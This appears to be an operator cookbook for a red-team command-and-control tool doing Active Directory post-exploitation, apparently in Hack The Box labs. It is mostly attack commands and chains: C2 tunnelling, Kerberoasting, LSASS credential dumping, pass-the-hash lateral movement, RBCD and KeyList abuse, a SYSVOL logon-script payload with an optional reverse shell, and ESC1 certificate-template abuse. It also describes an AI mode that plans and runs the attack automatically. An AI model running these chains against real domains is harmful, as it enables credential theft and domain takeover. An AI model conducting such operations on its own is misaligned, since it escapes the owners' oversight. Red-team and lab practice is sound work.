# AD engagement cookbook (Sprint 1–2)

Focused **internal AD post-ex** path. Not an MSF replacement.

**Fill-the-skeleton plan:** `docs/plans/FILL_AD_SKELETON.md` (inbound first, then host AD brain, lean C).

## 0. Inbound first (every eng)

If the box cannot reach your VPN, or you cannot reach the DC from the operator host, **do this before LDAP/SMB/Kerberos**.

```bash
erebus inbound status                         # tun0, :8443, ALL_PROXY, firewalld
erebus inbound tunnel user@TARGET             # box cannot reach tun0 → C2 on 127.0.0.1:8443
# after C Linux session:
erebus op socks start --port 1080
eval "$(erebus inbound env --port 1080)"      # ALL_PROXY for host ldap/smb/ad/kerberos
erebus ldap bind --dc DC --domain DOM --user u --pass-file p
```

Host tools honor `EREBUS_PROXY` / `ALL_PROXY` (SOCKS5). Full checklist: `docs/OPERATOR_INBOUND.md`.

## Sprint 1 path (golden)

```
foothold (implant)
  → recon (whoami, ifconfig, processes)
  → ldap_enum kerberoastable
  → kerberoast
  → mission_complete / summarize
```

Approvals: `ldap_enum`, `kerberoast` (high).

## Soft-compromise path (Support / Logging style)

```
# Host-side first when WinRM is filtered / no implant yet:
erebus smb shares --host DC --anon
erebus ldap enum --dc DC --domain DOM --user u --pass-file p --type interesting
erebus ldap dangling --dc DC --domain DOM --user u --pass-file p

foothold (implant)
  → recon
  → smb list_shares / list_dir / download (anon or creds)
  → ldap_enum interesting (+ kerberoastable) with password or ntlm_hash
  → lateral winrm <target> <cmd> --user u --pass p   # or --hash <NT>
  → summarize (no DA abuse unless objective requires)
```

Approvals: `smb`, `ldap_enum`, `lateral_move` (high/critical).

## Hard identity path (Garfield-class) — Sprint B+

```
kerberos skew --dc <DC>                    # preflight (fail loud if |skew| > 5m)
soft: smb write SYSVOL/NETLOGON + ldap set scriptPath (recipe)
  → interactive logon bot runs script → ForceChangePassword / marker
  → lateral winrm as privileged user
  → ad add-computer + rbcd write + kerberos s4u (AES)   # B.7–B.8
  → kerberos keylist (RODC krbtgt AES) → NT hash         # B.9
  → lateral winrm --hash
```

Full plan: `docs/plans/SPRINT_B_AD.md`. KeyList / RBCD write are **critical** approvals.

### Logon-script staging recipe (operator)

1. Confirm ACL: writable `scriptPath` on target user (or use `ldap-enum` / bloodyAD until B.8 ships).
2. Write payload to `\\<dc>\SYSVOL\<domain>\scripts\` (or NETLOGON) — e.g. ADSI ForceChangePassword + marker file + optional reverse shell.
3. Set `scriptPath` to the script name (relative to NETLOGON).
4. Wait for **interactive** logon (HTB bot); network/WinRM logon does **not** run logon scripts.
5. Detect success via marker on SYSVOL/Public, HTTP beacon, or new password WinRM.
6. Cleanup: restore original `scriptPath` and script content when done.

See also: `reports/htb-garfield/PROGRESS.md`.

## Sprint 2 path (job-complete)

```
… golden path …
  → creds_dump lsass|sam (approve)
  → lateral_move winrm|wmi to one host (approve)
  → socks_start (optional)
  → summarize loot
```

## Operator commands (quick)

```text
sessions
use <id>
shell whoami
ifconfig
smb list_shares --host 10.10.10.10 --anon
smb list_dir --host 10.10.10.10 --share support-tools --anon
smb download --host 10.10.10.10 --share Logs --path IdentitySync_Trace.log --user u --pass p
kerberos skew --dc dc.dom.local
ldap-enum interesting --domain DOM --dc dc.dom.local --user u --pass p
ldap-enum kerberoastable --domain DOM --dc dc.dom.local --hash <NT>
pending / approve <id>
kerberoast --domain DOM --dc dc.dom.local --user u --pass p
creds-dump lsass
lateral winrm <target> <cmd> --user u --pass p
lateral winrm <target> <cmd> --user u --hash <NThash> --domain DOM
loot
# Host-side (no session): erebus ad password --dc DC --domain D --user U --pass-file P --target T --new-pass-file N
# Sprint B+ (landing): ldap set scriptPath | ad add-computer
#                      rbcd write | kerberos s4u | kerberos keylist | ticket import
```

### Dangling ADCS templates (DanglingTree)

CA `certificateTemplates` may list names whose AD objects were deleted. Recreating the **same published name** as schema-v1 ESC1 (enrollee supplies subject + Client Auth) is enough — no ManageCA / enable-template.

- Do **not** copy the built-in `User` `nTSecurityDescriptor` at create time (locks the object to EA/DA).
- Creator-owner can then grant Enroll / GenericAll.
- Always request with UPN **and** object SID (`-500` for Administrator).
- Check `kerberos skew --dc` before PKINIT (DanglingTree was +7h).

`erebus ldap dangling` lists published-minus-existing names. Template create / certipy req remain a Sprint E gap.

## AI

```text
ai
# Plan → Auto
# Frozen objective in docs/GOLDEN_DEMO.md
```

## OPSEC

- Prefer `generate --language c` for Windows when toolchain available  
- Interactive eng: `--sleep 500`  
- Production: higher sleep + jitter  
